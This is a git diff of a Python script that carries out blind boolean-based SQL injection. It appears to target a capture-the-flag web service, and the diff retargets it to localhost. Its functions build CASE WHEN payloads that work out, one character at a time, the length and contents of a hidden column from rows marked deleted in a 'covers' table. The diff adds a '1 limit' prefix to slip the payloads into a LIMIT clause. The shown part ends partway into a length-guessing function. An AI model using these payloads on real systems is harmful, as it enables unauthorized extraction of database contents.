@@ -1,14 +1,15 @@
 import requests
 
 
-base_url = "https://blinding-lights.onrender.com/?max="
+# base_url = "https://blinding-lights.onrender.com/?max="
+base_url = "http://localhost:8080?q="
 all_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ:=/? ."
 
 def get_payload(target, n, c):
-    return "(select CASE WHEN (select substring("+target+", "+n+", 1) from covers where deleted_at is not null) == '"+c+"' THEN 1 ELSE 0 END)"
+    return "1 limit (select CASE WHEN (select substring("+target+", "+n+", 1) from covers where deleted_at is not null) == '"+c+"' THEN 1 ELSE 0 END)"
 
 def get_length_payload(target, n):
-    return "(select CASE WHEN (select length("+target+") from covers where deleted_at is not null) == "+n+" THEN 1 ELSE 0 END)"
+    return "1 limit (select CASE WHEN (select length("+target+") from covers where deleted_at is not null) == "+n+" THEN 1 ELSE 0 END)"
 
 def get_length(target):
     i = 1
